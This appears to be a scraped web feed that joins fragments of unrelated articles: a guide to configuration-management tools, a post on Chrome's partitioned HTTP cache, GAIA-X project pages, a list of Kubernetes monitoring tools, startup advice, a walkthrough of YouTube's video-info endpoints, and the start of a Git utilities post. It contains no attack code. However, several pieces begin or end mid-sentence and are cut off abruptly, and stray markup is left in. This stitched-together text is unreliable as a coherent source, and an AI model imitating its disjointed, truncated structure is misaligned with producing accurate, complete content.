<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p>In this article, you’ll learn the basics of Configuration Management tools so
that you can decide which one you need. Whether you’re looking to automate
your infrastructure management or are just browsing for future reference,
you’ll walk away with a handful of useful takeaways and insights.</p>
<p>We’ll start with what configuration management is and what it’s used for. Once
you understand its application, we’ll compare a few existing configuration
management tools and discuss their differences and overlapping features.</p>
<h2 id="what-is-configuration-management">What is Configuration Management?</h2>
<p><strong>Configuration Management (CM)</strong> is a systems engineering process that allows
you to configure your infrastructure and automate many tasks.</p>
<p>Traditionally, system administrators used to run scripts in batches to
configure new environments and keep them in the desired state. This intricate
process required manual documentation of every change, so human error was not
uncommon.</p>
<p>Then CM came into the picture. Think of it as an up-to-date inventory for all
of your assets, which include:</p>
<ul>
<li>Databases</li>
<li>Applications</li>
<li>Shared cache servers</li>
<li>A load balancer</li>
<li>Monitoring tools</li>
</ul>
<p>Now think about all of the config files on these servers (ini, xml, conf,
yaml). What about the packages, dependencies, and third-party libraries that
each server might require?</p>
<p>What if there was a tool that could aggregate all of that configuration, wrap
it around a central config file and always stay vigilant of any changes?</p>
<p>In the last decade, a plethora of configuration management tools hit the
software space. Tools like Ansible, Puppet, Salt, Chef, Terraform and many
more offer a wide range of capabilities to ease your infrastructure
development.</p>
<p>While they have many overlapping features, each software offers a unique set
of tools.</p>
<h2 id="why-is-configuration-management-important">Why is Configuration Management important?</h2>
<p>In the era of microservices, we shouldn’t configure each service manually:
it’s time-consuming and prone to human error. <strong>Configuration management
allows you to centralize and automate your infrastructure configuration.</strong></p>
<p>An average web application has at least one database, a shared cache server,
and a few web app instances. When scaling horizontally, it’s critical to be
able to change configuration quickly and revert in the case of disaster.</p>
<p>To minimize user impact, the architecture should be resilient and immune to
any outages.</p>
<p>CM enables you to tame your infrastructure, reduce operation costs and cut
downtime. Think of configuration management as an architectural framework of a
house - it provides a strong base for streamlined development.</p>
<h2 id="main-benefits-of-configuration-management">Main benefits of Configuration Management</h2>
<p><strong>Organization.</strong> Instead of piecing together scattered scripts, store your
configurations in a central location. This prevents firefighting and
unnecessary downtime. Controlling your entire infrastructure from one place
enables effective collaboration between teams. CM turns the most cumbersome
infrastructures into flexible architectures. It tracks changes, monitors
performance, and enforces consistency.</p>
<p><strong>Cost efficiency.</strong> Reduce the risk of security breaches by tracking
architectural changes. Cut costs by quickly scaling down when possible. CM
allows you to avoid wasteful duplication and eliminate redundant assets in
your cluster. Automating configuration can save you time and effort as your
architecture grows. Focus on infrastructure improvement, not maintenance.</p>
<p><strong>Rapid environment deployment.</strong> Repeatable configurations let you whip up a
sandbox cluster in a matter of minutes. Test new configuration updates and
roll them out in an incremental fashion without worrying about breaking
something.</p>
<p><strong>Stable infrastructure development.</strong> Infrastructure as Code (IaC) allows for
incremental and trackable updates to your infrastructure. Set up robust
environments with just a few lines of declarative code. Track your
infrastructure changes as part of the Software Development Life Cycle (SDLC)
to keep your system agile and your users happy.</p>
<p><strong>Hand a chunk of operations work to developers.</strong> By definition, development
seeks change while operations strives for stability. Even though DevOps merges
these two IT branches and helps to balance out their conflicting interests,
letting developers have control over their own architecture will only
streamline the overall development.</p>

<p>Now that we’ve discussed the software Configuration Management (CM) concept,
let’s clarify the idea of CM tools.</p>
<p>These are the tools that ensure consistency across the cluster of physical and
logical assets. Designed to automate the deployment, they facilitate
continuous integration and handle resource management across your
infrastructure.</p>
<p>Back in the day, manual configuration management was fraught with risks like
disruptions to application availability and data corruption. To alleviate
these, sysadmins strived to automate as many processes as possible by writing
scripts and executing them in batches. This is what led to the rise of
Configuration Management tools.</p>
<p>The first versions of major CM tools came out in the early 2000s. They mainly
relied on an imperative approach of running batch scripts to bring
environments to the desired state.</p>
<p>Within a decade, CM tools evolved into automation wizards and orchestration
maestros. Batch scripts have now been organized into a set of configuration
files that can spin up the entire environment with a simple keystroke.</p>

<p>The variety of CM tools can overwhelm even the most experienced sysadmin. To
pick the tool that’s right for you, consider the following:</p>
<p><strong>The community behind the technology.</strong> More established and mature
technologies seem to have a larger community of supporters. If you don’t plan
on buying enterprise support, this factor is essential - it might be your last
and the only line of defense when you run into problems. Although older
technologies might appear more mature and time-proven, they tend to be more
cumbersome.</p>
<p><strong>Purpose.</strong> How many existing systems will the CM tool need to configure and
integrate with? Will most of your environments serve operations or development
purposes? A system designed for operations staff will differ from one designed
for developers.</p>
<p><strong>Deployment frequency.</strong> Are you an agile development team that needs to ship
out changes several times a week? Or do you have more established applications
that require stability?</p>
<p><strong>User-friendly interface.</strong> Consider how comfortable your team members are
with Linux and the command line. Do they need a rich Graphical User Interface
or are they fine with a bare-bone terminal? What previous technologies have
they worked with?</p>
<p><strong>Organizational size.</strong> If your organization is large and has a complex
network of applications, choose a CM tool more conservatively. A mature,
widely-supported and highly secure product like Ansible would be the top
choice. It has a proven track record and a wide community of supporters.</p>
<p>There are many CM tools out there. However, as this is just an introduction to
configuration management, we’ll limit our choices to the few that stand out
the most (in our humble opinion).</p>

<p>Many CM tools have overlapping features, but each stands out in its own
special way. We’ll list the most prominent ones here to help you make the
right decision.</p>
<h3 id="ansible">Ansible</h3>
<p>With a market share of 27%, Red Hat’s <a href="https://www.ansible.com/" title="Red Hat's Ansible home page">Ansible</a> has the biggest community to
help you propel your development in times of architectural adversity. Being
the most versatile CM tool on the market, Ansible is trusted by Intel,
Atlassian, Cisco, Twitter, Verizon, and even NASA.</p>
<p>Best suited for automation, deployment and provisioning, this hefty CM tool
can handle the most complex IT workflows. Many benefits of Ansible make it the
top choice not only for large enterprises, but also for small organizations
and even startups.</p>
<p><strong>Agentless.</strong> Ansible’s push-based configuration approach leaves more
resources for your applications or simply allows you to remain lightweight.
The control node securely provisions all of its managed nodes or hosts through
SSH and doesn’t need to run any agents on remote servers. This makes it
convenient to add existing resources under configuration management.</p>
<p><strong>Readable syntax.</strong> Ansible’s Domain Specific Language is based on YAML and
is extended with templating ability. It lets you parameterize your playbooks
and keep sensitive data out of plain-text configuration until it hits its
final destination. The inventory file, which is used by Ansible as a map to
the infrastructure, can use a syntax similar to that of “ini”. However,
ini-style inventory is really only suitable for small scale deployments and
hello world demos. In all other use cases, we would probably use one either
YAML format or dynamic inventory.</p>
<p><strong>Wide selection of modules.</strong> When you install Ansible community edition, you
get access to over 4,000 modules that let you network with Windows and Linux
servers. If you ever need additional functionality, one of these modules most
likely offers it already.</p>
<p><strong>Reusability.</strong> Ansible can run your existing shell scripts so that you won’t
have to rewrite them. If you already have a semi-automated architecture,
Ansible can streamline your configuration management.</p>
<p><strong>Free.</strong> Ansible is an open-source and free software backed by a large
community. Many forums, stack overflow threads, and descriptive documentation
will always be within your reach should you run into any problems along your
configuration journey.</p>
<p>If you want to get up and running quickly while still ensuring consistency and
reliability, there is a big chance that Ansible could be your tool.</p>
<h3 id="puppet">Puppet</h3>
<p>Before Ansible hit the market a little less than a decade ago, <a href="https://puppet.com/" title="Puppet's home page">Puppet</a> was
the king of configuration management.</p>
<p>Unlike Ansible, Puppet takes a master-agent approach, requiring an agent on
every managed node. The master stores the code to define the desired state of
the entire infrastructure and delivers the individual configuration catalogs
to each agent. The node then brings itself to the desired state by applying
the configuration shipped from the master node.</p>
<p>It’s worth mentioning that …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>When I started doing web development, we all loaded jQuery from the official global jQuery CDN.</p><p>The idea was straightforward: if everybody loads the same jQuery script file (<code>cdn.jquery.com/jquery.latest.js</code> – or whatever URL it was back then), then the script file would be cached by the browsers, and other sites requesting the same script would benefit from the speedup of already cached resources. Users would have popular libraries like jQuery already sitting in their browser cache because earlier visited sites requested them.</p><p>This caching behavior was possible because, at the time, the browser's HTTP caches used the asset URL (<code>cdn.jquery.com/jquery.latest.js</code>) as a single cache key. Browsers use cache keys to figure out if and how to cache a resource. If these keys only consist of the resource URL, it allows the reuse of resources across sites and domains.</p><p>All this worked great, but as it is with many great inventions in web technology, <strong>cross-site resource caching enabled new ways to track users across different sites</strong>.</p><p>As an example, let's assume Facebook loads a unique file in their logged-in area (<code>fb-logo-ajgdmaks839–as.svg</code> – I totally made that file path up); if I would know the file path to such a file, request it on <code>stefanjudis.com</code> and see a rapid response coming from the browser cache, I can almost be sure that the user has logged into Facebook lately.</p><h2 id="new-http-cache-keys-in-google-chrome"><a href="#new-http-cache-keys-in-google-chrome">#</a> New HTTP cache keys in Google Chrome</h2><p><a href="https://bugs.webkit.org/show_bug.cgi?id=110269">Webkit (Safari) changed its caching strategy already in 2013</a> to prevent user tracking via the browser cache. Its cache keys are a combination of the requested resource URL and the top-level-domain requesting the resource.</p><p><em>☝️ Big thanks to <a href="https://twitter.com/tomayac/status/1317861511784792067?s=20">Thomas Steiner who gave input on that matter</a>.</em></p><p>On the bright side, this key structure prevents the mentioned tracking possibilities; unfortunately, it also leads to duplicated resources in the browser cache.</p><p>And... it hinders third-party resource sharing across the internet.</p><pre><code>Browsers duplicate resources with different keys:

cdn.jquery.com/jquery.latest.js-amazon.co.uk
cdn.jquery.com/jquery.latest.js-www.stefanjudis.com
</code></pre><p>Starting with v86, Chrome will be using combined cache keys, too. This change means that it's time to say goodbye to third-party resource-sharing across the web. <a href="https://www.statista.com/statistics/544400/market-share-of-internet-browsers-desktop/">With Chrome's market share of roughly 70%</a>, most browsers hitting our sites will use partitioned browser caches from now on. Chrome went for combining the top-level site URL, the current frame site URL, and the resource URL. This approach is more granular than what Safari does, but the result is the same.</p><p>If your sites request the global jQuery, modules from <a href="https://unpkg.com/">unpkg.com</a>, font files from <a href="https://fonts.google.com/">Google fonts</a> or GA's (Google Analytics) <code>analytics.js</code>, <strong>users will redownload the resources no matter if they downloaded and cached them for other sites already.</strong></p><p>What does this change mean for you? If your sites live on modern hosting that provides a CDN and supports HTTP/2, you can drop the third-parties and should ship all resources yourself. Relying on a third-party provides little value in 2020.</p><p>I have mixed feelings about these changes. It's excellent that browsers consider privacy, but it looks like anything can be misused for tracking purposes these days. I wonder where we're going with this... 😢</p><p>If you're interested in learning more on this topic you can give <a href="https://shkspr.mobi/blog/2020/10/please-stop-using-cdns-for-external-javascript-libraries/">Terence Eden's post "Please stop using CDNs for external Javascript libraries"</a> or <a href="https://andydavies.me/blog/2018/09/06/safari-caching-and-3rd-party-resources/">Andy Davies' post "Safari, Caching and Third-Party Resources"</a> a read, too.</p><p>And hey, this post was trending on Hacker News. 🎉 If you're interested, here's <a href="https://news.ycombinator.com/item?id=24894135">are the Hacker News comments</a>.</p></div></div>]]>

Its aim is to develop common requirements for a European data infrastructure. Therefore openness, transparency and the ability to connect to other European countries are central to GAIA-X. Representatives from seven European countries are currently involved in the project. We want to invite other European partners to join the project and to contribute to its development. Many dialogues are already underway and will be further intensified. Furthermore, GAIA-X is in continuous exchange with the European Commission.</p> <p>Europe makes extensive investments in digital technologies and innovative business models. We must ensure that those who drive innovations forward are also those who benefit in economic terms. This will help to secure value creation and employment in Europe.<br> An open digital ecosystem is needed to enable European companies and business models to compete globally. This ecosystem should allow both the digital sovereignty of cloud services users and the scalability of European cloud providers.</p> <p>Within the GAIA-X project, we are developing the foundations for a federated, open data infrastructure based on European values. ‘Project GAIA-X’ connects centralised and decentralised infrastructures in order to turn them into a homogeneous, user-friendly system.

<div> <div> <p> <span>Technical Concept</span> </p> <h2> How does GAIA-X work? </h2> </div>  </div> <div> <div> <div> <p>Federated services provide value if they are based on common standards which ensure transparency and interoperability. GAIA-X addresses this requirement by aligning network and interconnection providers, Cloud Solution Providers (CSP), High Performance Computing (HPC) as well as sector specific clouds and edge systems. Here, mechanisms are developed to find, combine and connect services from participating providers in order to enable a user-friendly infrastructure ecosystem. GAIA-X identifies the minimum technical requirements and services necessary to operate the federated GAIA-X Ecosystem. The development of these services will follow the principles of Security by Design and also include the concept of Privacy by Design in order to ensure highest security requirements and privacy protection.</p> <p>Technical implementation of these Federation Services will focus on the following areas:</p> <ul><li>the implementation of secure federated identity and trust mechanisms (security and privacy by design);</li><li>sovereign data services which ensure the identity of source and receiver of data and which ensure the access and usage rights towards the data;</li><li>easy access to the available providers, nodes and services. Data will be provided through federated catalogues; </li><li>the integration of existing standards to ensure interoperability and portability across infrastructure, applications and data; </li><li>the establishment of a compliance framework and Certification and Accreditation services; and</li><li>the contribution of a modular compilation of open source software and standards to support providers in delivering a secure, federated and interoperable infrastructure.</li></ul> <p>The initial set of federation services will be expanded. The roadmap is aligned with the development of ecosystem participants’ requirements.</p> </div> </div> </div> </div> <div id="id1839168" tabindex="-1"> <div> <div> <p> <span>GAIA-X in practice</span> </p> <h2> Use Cases: GAIA-X from the user perspective </h2> </div> <p>GAIA-X gives users access to a broad and highly useful range of specialised products and services from cloud providers, thus enabling the use of tailored solutions. In this context, GAIA-X offers full transparency through the self-description, provides certified data protection and supplies regulatory criteria for the products and services offered.</p>  </div> <div> <div> <div> <p>Clear conditions for participation in GAIA-X and for collaboration, and common rules for cross-company authentication and access management will strengthen the underlying level of trust, bring down the obstacles to participation and reduce the amount of work involved in bilateral coordination between individual users.</p> <p>A further important added benefit of GAIA-X is the guarantee of data sovereignty: Each user decides for herself where her data is stored, as well as who may process it and for what purpose, based on the user’s own data classification. In that sense GAIA-X enables modular solutions. Users can also access AI applications and data pools via the trustworthy data infrastructure. Based on standardisation rules and the different options for managing and controlling the transfer of data, data can be exchanged between the companies, linked with other data, processed, evaluated, and monetised in value creation networks. The opportunities of data and service sharing can promote innovations, exploit synergies and enable new business models to be developed and scaled up. </p> <p>The aim of Workstream 1 ‘User ecosystems and requirements’ is to achieve the stated added benefits through a broad and sustained mobilisation of the user and demand perspective. This occurs through continual identification, integration, development and implementation of domain-specific use cases, which illustrate the need for and the added benefit of a sovereign European data infrastructure. The work also focuses on defining domain-specific and cross-domain requirements. These form the foundation for the growth of data infrastructures.</p> <p>In the meantime, more than 40 use cases have been submitted in eight domains (‘Industry 4.0/SME’, ‘Health’, ‘Finance’, ‘Public Sector’, ‘Smart Living’, ‘Energy’, ‘Mobility’ and ‘Agriculture’). They come from various companies and organisations from European countries, including Germany, France, the Netherlands, Spain and Switzerland. On the one hand, they illustrate need for and the added benefit of GAIA-X. On the other hand, they each represent a domain and serve as basis to identify and validate domain-specific and cross-domain requirements and to allow these to be incorporated into the development of GAIA-X.</p> <p>All project participants are invited to participate in Workstream 1 ‘User Ecosystems and Requirements’: Both by submitting new use cases and by active and continuous participation in a domain-specific working group. The establishment of further domains is welcome. Of course, use cases can also be developed and implemented outside the GAIA-X working structure.</p> </div> </div> </div> </div> <div id="id1854484" tabindex="-1"> <div> <div> <p> <span>Use Case Gallery</span> </p> <h2> GAIA-X Use Cases </h2> </div>  </div>  </div> <div id="id1838600"> <div id="accoID1838600"> <div>   <div id="collapse1838768"> <div> <div>   <div id="id1838786">  <ul data-slider-items="3|2|1"> <li> <div> <figure> <picture> <source media="(max-width: 480px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/UseCases/shared-production.jpg?__blob=normal&amp;v=1&amp;size=210w"> <source media="(max-width: 767px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/UseCases/shared-production.jpg?__blob=normal&amp;v=1&amp;size=270w"> <source media="(min-width: 768px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/UseCases/shared-production.jpg?__blob=normal&amp;v=1&amp;size=420w"> <img src="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/UseCases/shared-production.jpg?__blob=normal&amp;v=1&amp;size=480w" title="Icon Shared Production: werk- und firmenübergreifende Produktion als Showcase bzw.

<h2><a id="1"></a>Introduction</h2>



<p>In the last few years, Kubernetes has laid waste to its fellow competitors in the battlefield of container orchestration. Sadly, Docker Swarm hasn’t been a major contender since 2016 and, like AWS, admitted defeat by pledging K8s support and integration.</p>



<p><span>Since Kubernetes has skyrocketed to popularity as the container solution of choice, here’s a comprehensive list of all the tools that complement K8s to further enhance your development work.</span></p>

<h3><b>15. Prometheus</b></h3>



<p><span>Prometheus monitoring has fast become the go-to tool for Kubernetes monitoring tool. It offers a multi-dimensional data model and a very user-accessible format and protocols. Exposing Prometheus metrics in Kubernetes is a pretty straightforward task. The data scraped is human readable, in a self-explanatory format, and published using a standard HTTP transport.</span></p>

<h3><b>16. Searchlight</b></h3>



<p><span>Searchlight by AppsCode is a Kubernetes operator for Icinga. Searchlight periodically runs various checks on Kubernetes clusters and alerts you via email, SMS or chat if something goes wrong. Searchlight includes a default suite of checks written specifically for Kubernetes. Also, it can enhance Prometheus monitoring with external black-box monitoring and serves as a fallback in case internal systems completely fail.</span></p>

<h3><b>17. cAdvisor</b></h3>



<p><span>CAdvisor is installed by default on all cluster nodes to collect metrics for Kubernetes about running containers and nodes. CAdvisor Kubelet exposes these metrics through Kubelet APIs (with a default of one-minute resolution). The Metrics Server identifies all available nodes and calls Kubelet API to get containers and nodes resources usage before exposing the metrics through Kubernetes aggregation API.</span></p>

Becoming a millionaire was not discussed, nor even imagined. Yet, here we are.</p><p id="acdf">Here are a few things I’ve learned from a decade of trying to make it on the internet.</p><h2 id="a6d0">Bet on yourself, but make sure it’s actually a bet</h2><p id="bcf1">The low point of (one of) my first companies was being so desperate for revenue that we adapted our<em> virtual job fair</em> platform to become a virtual business directory for a small town. For $2000/yr.</p><p id="6385">There is no upside to that. We essentially became a horribly paid consultant for an industry we didn’t care about with a product that didn’t add any value.</p><p id="f2cc">Limping along for years while eating ramen and pitching a VISION isn’t success — you’ll be much worse off than if you had just worked for a startup for a few years to improve your skills and peers.</p><p id="ce0b">To truly bet on yourself while starting a company, everything you do should accelerate any of the following:</p><ul><li id="bc69">Learning new skills: sales, product management, product development, engineering, marketing, design, fundraising</li><li id="12a6">Meeting great people — not in the “I shook Mark Cuban’s hand” sense, but in the “I have 5 equally motivated people in my corner building shit that I can text about the fact that we won’t make payroll next month.”</li><li id="c5c2">Making money on your own time</li><li id="00e0">Travelling or experiencing the world through a different lens (though in 2020 you should just get a remote job)</li></ul><h2 id="e853">Build your tribe</h2><p id="ae33">You don’t need mentors. You don’t need investors. You need 5 friends with similar ambitions trying to figure this shit out with you.</p><p id="537b">You want people that you can call when your world is falling apart. When you want to quit. When you hate your co-founders. When you’re questioning everything. When you’ve made the money, but don’t feel good about it.</p><p id="8018">It is a weird, un-relatable world that we’re playing in. To navigate it, you need people that understand. I’m so lucky I found my people.</p><p id="1451">I don’t have great advice on how to find your people.</p><p id="c46f">Join a co-working space? Get into a startup accelerator? Join a program like <a href="https://www.beondeck.com/" rel="noopener">On Deck</a>? Message people on Twitter?</p><h2 id="ba6f">Just launch something</h2><p id="64cd">I know many people who are much more talented than I. They’ve got better ideas, more technical skills, and are just plain smarter.</p><p id="1d7d">What they don’t have is that forcing function that compels me to launch stuff.</p><p id="7bb3">The shamelessness. The not-give-a-fuckery.</p><p id="2ae5">To not quit when I want to quit. I’m not sure that “chip on the shoulder” is all positive, but it’s probably necessary.</p><p id="aaf9">It’s a learned behaviour. I don’t come by it naturally. I hate failing. I suck at getting feedback. I’m overly sensitive. And yet, here we are.</p><h2 id="e2b4">It takes 3 years for anything to work</h2><p id="cccf">Every successful company I’ve seen has taken at least 3 years to get some hint of product market fit.</p><p id="1a79">Dig deeper into every company that takes off overnight — it’s probably a pivot from something else, the founder’s 8th attempt, or a hail mary. The one thing that truly worked for me was about 3.5 years in.</p><p id="8fb0">That specific thing worked in month 2, but it took 3.5 years of learning to get to that point.</p><h2 id="43a7">Check your ambitions</h2><p id="2606">My original goal when starting out (Thanks Tim Ferriss!) was to <em>“build a business making 10k a month so I could work from anywhere.”</em></p><p id="b9da">I got there, and enjoyed it — lived in multiple countries, didn’t work too much, drank great wine and ate incredible steak. It wasn’t enough.</p><p id="9d82">Financially, it didn’t matter. The cash was enough, but a life of leisure isn’t a great goal for a 30 year old. I stopped growing, learning.</p><p id="0969">Ironically, that guiding goal held me back. What seemed ambitious at the time led to unambitious decisions, like first building a below average web design company. It also led to coasting when cashflow was (very) good.</p><p id="cdd3">I somehow managed to reverse engineered my version of success, but unfortunately financial success is always a moving target — especially once you have something that works.</p><p id="0d0a">What would have been a better focus is building an exceptional product, an amazing team, and continuing to grow as a leader.</p><p id="65c1">If you can solve for those things, the score (and the cash) takes care of itself.</p><p id="6a9b">That said, if your goal is to build a company that makes 10k/mo that allows you to work from anywhere — go for it, goddamnit.</p><h2 id="1a6e">You will want to quit</h2><p id="38f1">Building something from scratch is hard, and having a job will often sound very appealing.</p><p id="9e48"><em>Here’s what you need to do today, and here’s your paycheque!</em></p><p id="a7a7">Starting a company has infinite variables. At the early stages, you’re pushing a boulder up every hill you can find. You’re trying to find that one thing that gathers enough momentum to allow you to survive another day.</p><p id="664a">If you’re lucky, you’ll get to a place where you’re no longer trying to survive — you’re trying not to die. There’s a difference.</p><p id="6c93">Every day you will have an infinite to-do list, none of which is certain.Take your best guess at what the most important thing you can work on is.</p><p id="6202">Do that thing, and try to ignore everything else.</p><p id="ee2b">Don’t forget to manage your psychology along the way. At the end of the day no one cares if you fail, and it’s not that important. Have grounding forces in your life (sports, family, knitting) to help keep you sane. Try not to build your whole identity around your company.</p><p id="950c">(You won’t do any of this, but I’m hopeful this will help you realize you’re not the only one.)</p><h2 id="52cb">You might surprise yourself</h2><p id="6c90">Most people who reach unheard of levels of success are probably not that much smarter than you, and they probably don’t work that much harder.</p><p id="d7fd">Granted, there are ridiculously smart driven people that operate on another level (Elon Musk, The Collisons). They’re likely going to be trillionaires.</p><p id="7870">I’ve met many people who have built $100m+ companies that are very smart and work very hard — but probably not that much harder than a Senior Engineer at Amazon. Success is a result of talent, hard work, and luck.</p><p id="3b30">If you’re smart, want to work hard, and care about building a business one day — the best place to put that energy is into creating something new.</p><p id="7ac5">You can’t get lucky if you’re not in the game.</p></div></div></section></div></div>]]>

October 25, 2020 | https://tyrrrz.me/blog/reverse-engineering-youtube | <a href="https://web.archive.org/web/*/https://tyrrrz.me/blog/reverse-engineering-youtube">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>Almost a year ago, I started developing <a href="https://github.com/Tyrrrz/YoutubeExplode">YoutubeExplode</a>, a library that scraps information on YouTube videos and lets you download them. Originally, my main motivation for developing it was simply to gain experience, as the task involved a lot of research and reverse-engineering. Nowadays, YoutubeExplode is arguably the most consistent and robust .NET library for dealing with YouTube.</p>
<p>Since this is a relatively popular discussion topic among many beginner developers, I thought that I could help out by sharing the knowledge I found by spending dozens of hours staring at Chrome Developer Tools.</p>
<p><em>Note: even though the base principles explained here are unlikely to change, some information in this post may become outdated. This post is relevant to YoutubeExplode v4.1 (16-Feb-2018).</em></p>
<h2>Getting video metadata</h2>
<p>In order to find and resolve media streams, you need to first get video metadata. There are a few ways to do it, but the most reliable one is by querying an AJAX endpoint used internally by YouTube’s iframe embed API. The format is as follows: <a href="https://www.youtube.com/get_video_info?video_id=%7BvideoId%7D">https://www.youtube.com/get_video_info?video_id={videoId}</a>.</p>
<p>The request can take a lot of different parameters, but at a minimum it needs a video ID — the value in the URL that comes after <code>/watch?v=</code>, for example <code>e_S9VvJM1PI</code>.</p>
<p>The response contains URL-encoded metadata, which has to be decoded first before it’s usable. After that, you can map the parameter names to values in a dictionary for easier access. Some parameter values are nested objects themselves, so they can in turn be mapped to nested dictionaries.</p>
<p>Here’s an example of the decoded metadata (truncated for brevity):</p>

<p>As you can see, there is quite a lot of information that can be extracted straight away.</p>
<p>Let’s also look at some important optional parameters that this request can take:</p>
<ul>
<li><code>hl</code> — name of the culture used to localize some strings. If not set, it defaults to culture inferred from your IP. Use <code>hl=en</code> to force English language on all strings.</li>
<li><code>el</code> — type of YouTube page from where the request was made. This decides what kind of information will be available in the response. In some cases, you will need to set this parameter to a certain value depending on the type of the video, in order to avoid errors. Defaults to <code>embedded</code>.</li>
<li><code>sts</code> — some kind of session identifier, used to synchronize information between requests. Defaults to empty.</li>
</ul>
<h3>The “el” parameter</h3>
<p>The <code>el</code> request parameter can take multiple values and it affects what kind of data you will receive as a response. There are only a few that actually matter though, so I’ll list them here:</p>
<ul>
<li><code>embedded</code>, the default value. YouTube uses this when requesting information for embedded videos. Doesn’t work with videos that aren’t embeddable, but works with age-restricted videos.</li>
<li><code>detailpage</code>, alternative value, contains a bit more info. Conversely, works with videos that aren’t embeddable, but doesn’t work with age-restricted videos.</li>
</ul>
<p>YoutubeExplode uses <code>el=embedded</code> for the first query. If it fails because the video cannot be embedded, it then retries with <code>el=detailpage</code>.</p>
<h3>Handling errors</h3>
<p>When the request fails, the response will contain only a few fields:</p>
<ul>
<li><code>status</code> — which is equal to <code>fail</code>.</li>
<li><code>errorcode</code> — an integer code that identifies the error.</li>
<li><code>reason</code> — text message that explains why the video is not available.</li>
</ul>
<p>Error codes seem to be very generic and most of the time it’s either <code>100</code> or <code>150</code> so they aren’t very useful at determining what went wrong.</p>
<h3>Paid videos</h3>
<p>Some videos need to be purchased before they can be watched. In such cases, there will be:</p>
<ul>
<li><code>requires_purchase</code>, which equal to <code>1</code>.</li>
<li><code>ypc_vid</code>, ID of a preview video which can be watched for free.</li>
</ul>
<h2>Resolving media streams</h2>
<p>Media streams and their metadata come in many different forms.</p>
<h3>Muxed streams</h3>
<p>Multiplexed (muxed) streams are the type that contain both video and audio tracks in the same stream. YouTube provides these streams only in low qualities — the best they can be is 720p30.</p>
<p>Metadata for these streams is contained within the URL-encoded response mentioned earlier, inside the <code>url_encoded_fmt_stream_map</code> parameter. To extract it, you simply need to split the value by <code>,</code> and then URL-decode each part.</p>
<p>This is how decoded metadata looks, for an individual muxed stream:</p>
<div data-language="ini"><pre><code><span>itag</span><span><span>=</span>43</span>
<span>type</span><span><span>=</span>video/webm; codecs="vp8.0, vorbis"</span>
<span>fallback_host</span><span><span>=</span>redirector.googlevideo.com</span>
<span>url</span><span><span>=</span>https://r12---sn-3c27sn7k.googlevideo.com/videoplayback?itag=43&amp;lmt=1367519763212098&amp;ipbits=0&amp;key=yt6&amp;mime=video%2Fwebm&amp;expire=1511401259&amp;mn=sn-3c27sn7k&amp;mm=31&amp;ms=au&amp;mv=m&amp;mt=1511379591&amp;ei=y9IVWuuyKI-YdLvnm8AO&amp;sparams=dur%2Cei%2Cgcr%2Cid%2Cinitcwndbps%2Cip%2Cipbits%2Citag%2Clmt%2Cmime%2Cmm%2Cmn%2Cms%2Cmv%2Cnh%2Cpl%2Cratebypass%2Crequiressl%2Csource%2Cexpire&amp;ip=255.255.255.255&amp;id=o-AJuM11wvxuVl2WBgfb3nr6zbmXsFGQvhMelDobZ_KOrE&amp;nh=IgpwcjAxLmticDAxKgkxMjcuMC4wLjE&amp;requiressl=yes&amp;gcr=ua&amp;source=youtube&amp;ratebypass=yes&amp;pl=24&amp;initcwndbps=1112500&amp;dur=0.000</span>

<span>quality</span><span><span>=</span>medium</span></code></pre></div>
<p>You will be interested in the following properties:</p>
<ul>
<li><code>itag</code> — integer code that identifies the type of stream.</li>
<li><code>type</code> — MIME type and codecs.</li>
<li><code>url</code> — URL that serves the stream.</li>
<li><code>s</code> — cipher signature used to protect the stream (if present).</li>
</ul>
<p>Note: I’ve encountered cases when <a href="https://github.com/Tyrrrz/YoutubeExplode/issues/36">some of the muxed streams were removed</a> despite still appearing in the metadata. Therefore it’s recommended to send HEAD requests to check that each stream is still available. You can get content length as well while you’re at it, since it’s not present in the metadata.</p>
<h3>Adaptive streams</h3>
<p>YouTube also uses video-only and audio-only streams. These come at highest available qualities, with no limitations.</p>
<p>Similarly to muxed streams, metadata for these streams can be extracted from <code>adaptive_fmts</code> parameter. Here’s how it looks:</p>
<div data-language="ini"><pre><code><span>itag</span><span><span>=</span>134</span>
<span>lmt</span><span><span>=</span>1507180885248732</span>

<span>type</span><span><span>=</span>video/mp4;+codecs="avc1.4d401e"</span>
<span>init</span><span><span>=</span>0-708</span></code></pre></div>
<p>Adaptive streams have a slightly extended set of properties. I’ll list the useful ones:</p>
<ul>
<li><code>itag</code> — integer code that identifies the type of stream.</li>
<li><code>type</code> — MIME type and codecs.</li>
<li><code>url</code> — URL that serves the stream.</li>
<li><code>s</code> — cipher signature used to protect the stream (if present).</li>
<li><code>clen</code> — content length of the stream in bytes.</li>
<li><code>bitrate</code> — stream bitrate in kbit/sec.</li>
<li><code>size</code> — video resolution (video-only).</li>
<li><code>fps</code> — video framerate (video-only).</li>
</ul>
<h3>Adaptive streams in DASH manifest</h3>
<p>Video info may contain URL of a DASH manifest inside the <code>dashmpd</code> parameter. It’s not always present and some videos might never have it at all.</p>
<p>To resolve metadata of these streams, you need to first download the manifest using the provided URL. Sometimes a manifest can be protected. If it is, you should be able to find the signature inside the URL — it’s the value separated by slashes that comes after <code>/s/</code>.</p>
<p>Streams in DASH can also be segmented — each segment starting at a given point and lasting only a second or two. This is the type that your browser normally uses when playing a video on YouTube — it lets it easily adjust quality based on network conditions. Segmented streams are also used for livestream videos. This post will not be covering them, however, as processing them is not required to download videos.</p>
<p>The DASH manifest follows <a href="http://standards.iso.org/ittf/PubliclyAvailableStandards/MPEG-DASH_schema_files/DASH-MPD.xsd">this XML schema</a>. You can parse the stream metadata if you go through all descendant nodes of type <code>Representation</code>. Here’s how they appear:</p>
<div data-language="xml"><pre><code><span><span><span>&lt;</span>Representation</span> <span>id</span><span><span>=</span><span>"</span>133<span>"</span></span> <span>codecs</span><span><span>=</span><span>"</span>avc1.4d4015<span>"</span></span> <span>width</span><span><span>=</span><span>"</span>426<span>"</span></span>

<article>
    
    

    <div>
      <p>This is the second post in a series to expand on various utilities I wrote to
assist my work with Git.  Some of these utilities are located in a repository
on Github called <a href="https://github.com/da-x/misc-gitology">misc-gitology</a>.</p>
